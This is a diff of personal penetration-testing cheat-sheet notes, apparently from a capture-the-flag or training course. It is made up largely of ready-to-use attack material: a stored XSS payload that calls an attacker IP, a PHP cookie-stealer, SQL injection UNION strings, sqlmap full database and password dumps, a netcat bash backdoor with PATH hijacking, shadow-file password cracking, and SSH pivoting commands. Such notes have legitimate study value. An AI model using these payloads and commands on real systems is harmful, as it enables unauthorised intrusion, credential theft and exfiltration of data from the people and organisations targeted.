@@ -1,6 +1,5 @@
 /////////////Resources\\\\\\\\\\\\\
 
-shell-storm.org
 https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
 -or-
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
@@ -8,6 +7,11 @@ ubuntu metasploit install --> compluting for geeks
 socks proxy rfc
 wayback machine
 sqlbolt.com
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+shell-storm.org
+https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels
+
 /////////HTTP reponse codes////////
 10X == Informational
 2XX == Success
@@ -27,7 +31,6 @@ Set-Cookie
 wget -r -l2 -P /tmp ftp://<IP>/
 wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
 wget --load-cookies cookies.txt -p http://....com/interesting/article.php
-
 wget --mirror <ip>	#recursively copies all webpages it finds, not stopped by robots.txt
 	egrep -r '\b[[:alnum:]]{20}\b'	#cd into the dir wget creates, this looks for hashed flags
 	egrep -ir '\bf..g\b' 		#cd into the dir wget creates, this looks for mutated "flag"
@@ -39,6 +42,7 @@ addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5-->
 curl -o stuff.html http://website/stuff.html
 curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
 
+----------------------------------
 /////////Stored XSS/////////
 <img src="http://10.50.XX.XX" onerror="window.open(&quot;http://10.50.CC.CC:8000/ram.png&quot;,&quot;xss&quot;,'height=500,width=500');">
 
@@ -55,6 +59,7 @@ $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
 fwrite($steal,$cookie . "\n");
 fclose($steal);
 ?>
+-----------------------------------
 
 ///////// ReverseEngineering Notes \\\\\\\\\\\
 
@@ -63,7 +68,7 @@ md5sum *
 strings <on-file>
 ltrace ./<linux exe>
 strace ./<linux exe>	#more info than you might want
-=============================================================
+
 ///// GDB \\\\\
 
 gdb
@@ -111,102 +116,27 @@ admin' UNION SELECT SCHEMA_NAME,2,3,4,5 from Information_Schema.Schemata;#
 admin' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_Schema.Columns;#
 admin' UNION SELECT name,2,3,4,5 from session.user;#
 
-==========================================================================================
-///////////Recon Flags\\\\\\\\\\\\\\\\\\
-
-#pulls the flags --> grep -Er '[0-9a-zA-Z]{20}' | grep -vE 'fonts|{*}|js|Binary|css'
-
-#Create tunnel to internet_grey_host
-ssh -X 10.50.28.45 -L 7000:localhost:22 -NTf
-#note the 'f' backgrounds the tunnel. 
-	ps -elf | grep ssh	to view tunnel process
-
-#ssh to internet_grey_host && enumerate
-ssh localhost -p 7000
-scp -P 7000 anotherscan.sh localhost:	#scp scan script via tunnel
-
-ip addr-->10.10.28.40/27  (33-62)
-
-ip ne-->10.10.28.34
-	10.10.28.33
-	10.10.28.62
-
-#scrap webserver
-nmap --script=http-enum 192.168.28.111 
-   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
-   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
-   /sites/: Potentially interesting folder
-
-#Setup firefox to work with proxychains
-Step 1: ensure dynamic port is set and running
-ssh -D 9050 student@10.50.28.45 -NT
-
-Step 2:
-firefox(from ops)--> addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5--> (proxy ip) localhost --> (port) 9050
-
-#tunnel to 192.168.28.120
--L 7001:192.168.28.120:4242
-
-#scan 192.168.150.224/27
-for i in {224..254} ; do nc -nvzw1 192.168.150.$i 20-1024 2>&1 & done | grep -E 'OK$|succ|open$'
-
-#Enumerate SMB
-proxychains nmap --script=smb-os-discovery 192.168.150.245
-
 ==================================================================================================
-#python simple http server
-python -m SimpleHTTPServer
+python -m SimpleHTTPServer		#python simple http server
 
-#john
+//John the Ripper
 john --wordlist=passwordlist --rules --shells=sh,csh,tcsh,bash shadow #only crack accounts with shells
 john --wordlist=passwordlist --rules --users=0 shadow #only crack root accounts
 
 #if the question mentions a beacon
 tcpdump -i any -c 50 -q -t -X src not 192.168.28.100 and dst not 192.168.28.100 and port not 53
 
-#backdoor
+//Backdoor
 mknod /tmp/f p
 cat /tmp/f | /bin/bash -i 2>&1 | nc -lp 127.0.0.1 8888 > /tmp/f
 export PATH=/tmp:$PATH
 
-#SQLI
+//SQLI w/ sqlmap
 proxychains sqlmap -u http://10.50.21.166/login.html --forms --threads=10 --level=5 --risk=2 --dbms=mysql --batch --dbs --schema --tables --columns -b --users --passwords --exclude-sysdbs --dump-all -v 0
 proxychains sqlmap -u http://10.100.28.48/cases/productsCategory.php?category=1 --threads=10 --level=5 --risk=2 --dump-all --exclude-sysdbs --skip-static --hostname -v 0
 
-#SSH
+//SSH
 ssh -D 127.0.0.1:9050 user@ip -CNTX #dynamic pivot for proxychains
 ssh-keygen -t rsa 							#creates ~/.ssh id_rsa id_rsa.pub
 ssh-copy-id -i ~/.ssh/id_rsa.pub user@host 				#adds id_rsa.pub to remote user ~/.ssh/authorized_keys
 ssh -J user@pivot:port user@internalhost:port 				#tunnel straight to internal hosts thru pivot
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
